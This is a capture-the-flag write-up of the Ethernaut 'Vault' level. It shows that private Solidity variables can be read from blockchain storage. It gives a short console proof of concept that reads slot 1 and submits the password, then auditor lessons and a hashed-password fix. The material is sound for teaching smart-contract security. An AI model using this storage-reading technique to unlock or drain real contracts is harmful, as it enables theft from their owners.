---
title: 'Ethernaut - Vault'
description: 'Reading private storage variables directly from the blockchain. Learn how data visibility modifiers like private do not hide data on public blockchains.'
date: 2025-07-08
tags: ['solidity', 'security', 'storage', 'data-privacy', 'ethernaut', 'ctf']
image: '../../../../public/ethernaut.png'
authors: ['thesandf']
---

# 🔓 Vault - The Myth of Private Data

## Challenge Overview

The objective of this level is to **unlock** the `Vault` contract.

**The Catch:** The contract is currently locked, and the only way to unlock it is by calling `unlock()` with the correct `bytes32` password. However, the password is declared with the `private` modifier, meaning there are no getter functions to read it directly from the interface.

---

## Technical Analysis

### Vulnerability: Public Readability of Private State Variables

The `Vault` contract attempts to secure a password using the `private` keyword:

```solidity
contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

#### The Root Cause
A critical security misunderstanding in blockchain development is the distinction between **visibility** and **privacy**:
*   **`private` and `internal` modifiers**: These only restrict read access for **other smart contracts** at runtime. They prevent a contract from compiling a call to read that variable.
*   **Public Blockchain State**: Every transaction, contract creation, and storage slot is recorded on a completely transparent, public ledger. Anyone running an Ethereum node or using a web3 provider can inspect any storage slot of any contract address at zero cost.

#### Storage Layout Layout Analysis
Solidity storage is organized into sequential 32-byte slots (0-indexed):
1. **Slot 0**: `bool public locked` (uses 1 byte, padded with zeros).
2. **Slot 1**: `bytes32 private password` (uses the full 32 bytes).

Knowing this layout, we can use the RPC call `eth_getStorageAt` to read the raw bytes of slot 1 directly.

---

## The Exploit: The Multi-Step Solution

1. **Read the Storage Slot**: Use a web3 provider or console command to call `web3.eth.getStorageAt(contractAddress, 1)`.
2. **Submit the Password**: Call the `unlock()` function, passing the retrieved `bytes32` password as the parameter.
3. **Verify Status**: Verify that the `locked` variable has transitioned to `false`.

---

## Proof of Concept (PoC)

Below is the JavaScript console commands to execute in the Ethernaut console:

```javascript
// 1. Read slot 1 (where the private password is stored)
const passwordHex = await web3.eth.getStorageAt(contract.address, 1);
console.log("Found password:", passwordHex);

// 2. Submit the password to unlock the contract
await contract.unlock(passwordHex);

// Verify that the vault is unlocked
const isLocked = await contract.locked();
console.log("Is locked?", isLocked);
```

---

## Auditor's Lessons

1. **Zero On-Chain Privacy**: Assume all variables (even those marked `private`) are completely visible to the public. Never store plain-text passwords, API keys, private keys, or proprietary secrets on-chain.
2. **Understand Storage Packaging**: Be aware of how the Solidity compiler packs variables into 32-byte slots to correctly locate slot offsets during audits and debugging.
3. **Off-Chain Cryptography**: If your application requires secret parameters or hidden commitments (like a rock-paper-scissors game), use off-chain commit-reveal schemes where users submit hashes first and only reveal plain-text parameters later.

---

## Remediation

Remove any plain-text secrets. If a verification secret is necessary, store a cryptographic hash of the secret instead of the raw secret itself. The verification can then be performed by hashing the user's input:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SecureVault {
    bool public locked;
    bytes32 public passwordHash; // Publicly visible hash

    constructor(bytes32 _passwordHash) {
        locked = true;
        passwordHash = _passwordHash;
    }

    // Users submit the plain-text password, and we check if the hash matches
    function unlock(string calldata _password) external {
        if (keccak256(abi.encodePacked(_password)) == passwordHash) {
            locked = false;
        }
    }
}
```
